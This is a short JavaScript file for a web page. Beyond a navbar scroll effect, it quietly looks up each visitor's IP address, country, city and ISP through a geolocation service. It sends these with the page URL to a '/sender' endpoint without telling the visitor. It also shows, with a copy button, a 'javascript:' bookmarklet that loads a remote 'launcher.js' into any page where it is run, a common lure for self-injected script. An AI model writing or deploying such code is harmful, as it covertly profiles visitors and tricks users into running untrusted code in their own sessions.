$(document).ready(() => {
window.addEventListener("scroll", function () {
  const navbar = document.querySelector('.navbar');
  if (window.scrollY > 50) {
    navbar.style = 'background: rgba(0,0,0,.5); backdrop-filter: blur(3px);'
  } else {
   navbar.style = '--bs-bg-opacity: 0;'
  }
})

  fetch("https://ipapi.co/json")
    .then(response => response.json())
    .then(data => {
      if (!data) {
        return false
      }
      const query = `■■■■■🌐🌟👤■■■■■
🌐 IP: ${data.ip}
🗺 País: ${data.country_name}
🌃 Ciudad: ${data.city}
🔌Int. Comp: ${data.org}
🔗URL : ${location.href}
■■■■■■■■■■■■■■■`

fetch(`/sender?msg=${encodeURI(query)}`, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
})
.then(response => response.json())
.then(data => {
  console.log('Respuesta del servidor:', data);
})
.catch(error => {
  console.error('Error en la petición:', error);
});

    })
  .catch(error => console.error('Error:', error))

const code = `javascript:(function(){var s=document.createElement('script');s.src='https://${document.domain}/js/launcher.js';document.body.append(s);s.onload=function(){mainAct();}})();`

$('code').text(code)

$('.copyBtn').click(() => navigator.clipboard.writeText(code))

})